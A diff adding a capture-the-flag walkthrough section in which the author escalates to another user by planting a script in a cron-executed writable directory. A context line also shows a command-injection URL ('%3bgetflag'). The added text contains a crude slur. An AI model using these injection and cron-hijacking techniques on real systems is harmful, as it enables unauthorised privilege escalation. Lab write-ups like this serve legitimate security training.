@@ -171,3 +171,21 @@ http://localhost:3333/?x=%3bgetflag
 ```
 
 Where '3b' is the ascii hexcode for ';'. Then see the token on the page :)
+
+## Be careful what you script for (level05)
+
+The level05 home is empty. If we look inside /usr/sbin/ we can see that there
+is a script named 'openarenaserver' that belongs to flag05. It executes every
+bash script in the '/opt/openarenaserver' directory, on which level05 has full
+access. The script typically looks like it is executed with a cronjob, so all we
+have to do is write a script that will call the `getflag` command and save the
+output to a file:
+
+```shell
+# write this script in the directory
+cat << END > /opt/openarenaserver/script
+getflag > /tmp/flag
+END
+# wait for the flag fiel to appear (or just spam `cat /tmp/flag` like a retard)
+while [ ! -f /tmp/flag ]; do sleep 1; done; cat /tmp/flag
+```
